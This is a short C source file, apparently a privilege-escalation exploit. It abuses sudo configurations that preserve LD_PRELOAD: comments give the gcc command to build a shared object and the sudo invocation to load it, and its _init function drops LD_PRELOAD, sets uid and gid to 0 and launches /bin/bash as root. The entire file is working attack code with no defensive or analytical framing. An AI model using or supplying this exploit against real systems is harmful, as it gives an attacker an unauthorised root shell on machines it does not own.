/*
 * the executable used in the command has to be sudoable
 */
// gcc -fPIC -shared -o shell.so shell.c -nostartfiles
// sudo LD_PRELOAD=/home/user/shell.so <executable>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
}


